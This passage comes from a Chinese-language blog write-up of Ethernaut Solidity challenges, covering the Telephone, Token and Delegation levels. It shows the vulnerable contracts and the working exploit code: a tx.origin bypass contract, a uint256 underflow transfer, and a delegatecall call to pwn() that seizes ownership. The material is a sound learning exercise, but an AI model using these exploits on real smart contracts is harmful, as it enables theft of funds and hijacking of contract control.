+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Middle &#123;</span><br><span class="line">    Telephone target = Telephone(address(0x8634C2E372B1d8b509CE8B503356e9E5B45bab2a));</span><br><span class="line">    // Telephone target = Telephone(address(0x86cA07C6D491Ad7A535c26c5e35442f3e26e8497));</span><br><span class="line">    function caller(address _owner) public &#123;</span><br><span class="line">        target.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>这题是为了让我们了解Solidity的数据溢出</p>
+<p>题目合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目描述中说<code>player</code>的余额初始化为20 通关要求是让它大于20 这里用类似C的数据溢出来bypass <code>balances[msg.sender] - _value &gt;= 0</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((-<span class="number">0x666666</span> + <span class="number">20</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9999ae&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用以下合约调用目标函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0, &quot;balance too low&quot;);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GetToken &#123;</span><br><span class="line">    address public player = address(0x03741c1792729798cFb7d21554a90EFb57E6b278);</span><br><span class="line">    Token public target = Token(address(0x98Fa9020E34784b482981Ddf097da56a3e97E632));</span><br><span class="line">    uint256 public to_sub = uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9999ae);</span><br><span class="line">    function gtoken() public &#123;</span><br><span class="line">        target.transfer(&#123;_to : player, _value : to_sub&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h3><p>这题主要是要我们了解函数的<a target="_blank" rel="noopener" href="https://solidity-by-example.org/call/">低级调用方式</a></p>
+<p>.call和.delegatecall的用法都是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(bool success, bytes memory data) = targetContract.[delegate]call&#123;value: 1 ether&#125;(</span><br><span class="line">    abi.encodeWithSignature(&quot;functionName(uint256)&quot;, arg1)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>targetContract</code> 是要调用的合约地址</li>
+<li><code>&#123;value: 1 ether&#125;</code> 代表调用时附带 1 ETH(可选 除此之外还能指定<code>gas</code>)</li>
+<li><code>abi.encodeWithSignature(&quot;functionName(uint256)&quot;, arg1)</code> 用于编码要调用的函数名和参数</li>
+<li><code>success</code> 表示调用是否成功</li>
+<li><code>data</code> 是调用返回的原始数据</li>
+</ul>
+<p>区别是一个是在目标合约的内存区执行一个是在本地内存区执行 <code>.call</code>相当于执行靶机上的程序 修改了哪些值都只在靶机上进行了修改 <code>.delegatecall</code>相当于拉取靶机的代码到本地来执行 修改了哪些值都会体现在本地的值上</p>
+<p>因此如果要使用<code>.delegatecall</code>要确保目标函数中用到的值在本地也有</p>
+<p>本题合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们直接向目标合约发起带有被签名编码了的<code>&#39;pwn()&#39;</code>的转账来触发<code>fallback()</code>并将<code>Delegate</code>合约中的pwn拉到目标合约上执行来获取控制权:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:instance, <span class="attr">data</span>:web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;pwn()&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/01/08/BPF%E9%80%86%E5%90%91/" rel="prev" title="BPF逆向">
+      <i class="fa fa-chevron-left"></i> BPF逆向
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%A1%E6%9C%89%E4%B8%BB%E7%BD%91%E4%BD%99%E9%A2%9D%E8%A6%81%E6%B1%82%E7%9A%84sepolia%E6%B0%B4%E9%BE%99%E5%A4%B4"><span class="nav-number">1.</span> <span class="nav-text">没有主网余额要求的sepolia水龙头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8A%9D%E5%A3%AB%E5%8C%BA"><span class="nav-number">2.</span> <span class="nav-text">芝士区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.</span> <span class="nav-text">概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%88%E7%BA%A6%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B8%B8%E9%87%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">合约一些常用的常量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ethernaut%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="nav-number">3.</span> <span class="nav-text">Ethernaut做题记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hello-Ethernaut"><span class="nav-number">3.1.</span> <span class="nav-text">Hello Ethernaut</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fallback"><span class="nav-number">3.2.</span> <span class="nav-text">Fallback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fallout"><span class="nav-number">3.3.</span> <span class="nav-text">Fallout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coin-flip"><span class="nav-number">3.4.</span> <span class="nav-text">Coin flip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Telephone"><span class="nav-number">3.5.</span> <span class="nav-text">Telephone</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token"><span class="nav-number">3.6.</span> <span class="nav-text">Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Delegation"><span class="nav-number">3.7.</span> <span class="nav-text">Delegation</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1K0CT B14s"
+      src="/images/myavatar.gif">
+  <p class="site-author-name" itemprop="name">1K0CT B14s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+-->
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1K0CT B14s</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">441k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:41</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
